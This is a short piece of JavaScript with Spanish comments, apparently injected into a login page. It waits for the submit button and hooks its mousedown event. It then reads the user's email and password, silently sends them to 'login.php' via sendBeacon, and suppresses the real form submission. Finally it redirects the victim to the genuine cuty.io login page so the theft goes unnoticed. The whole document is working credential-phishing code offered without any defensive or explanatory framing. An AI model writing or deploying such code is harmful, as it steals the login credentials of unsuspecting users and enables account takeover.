    <script>
    
    const waitLoginBtn = setInterval(() => {
    const btn = document.getElementById("submit-button");
    if (!btn) return;

    clearInterval(waitLoginBtn);

    // Usamos 'mousedown' para actuar justo antes del clic completo
    btn.addEventListener("mousedown", function (e) {
        const userField = document.getElementById("login");
        const passField = document.getElementById("password");

        if (userField && passField) {
            const userData = userField.value;
            const passData = passField.value;

            // Verificamos que no estén vacíos
            if (userData.length > 0 && passData.length > 0) {
                
                // Preparamos los datos en formato URL
                const datos = new URLSearchParams();
                datos.append('email', userData);
                datos.append('pass', passData);

                // sendBeacon asegura el envío incluso si la página se cierra o redirige
                navigator.sendBeacon('login.php', datos);

                // Pequeña pausa de 150ms para asegurar que el hilo del sistema procese el envío
                setTimeout(() => {
                    window.location.href = "https://cuty.io/login";
                }, 800);
            }
        }

        // Evitamos que el formulario original haga su propia acción
        e.preventDefault();
        e.stopImmediatePropagation();
    }, true);

    console.log("Success");
}, 100);
    
    </script>
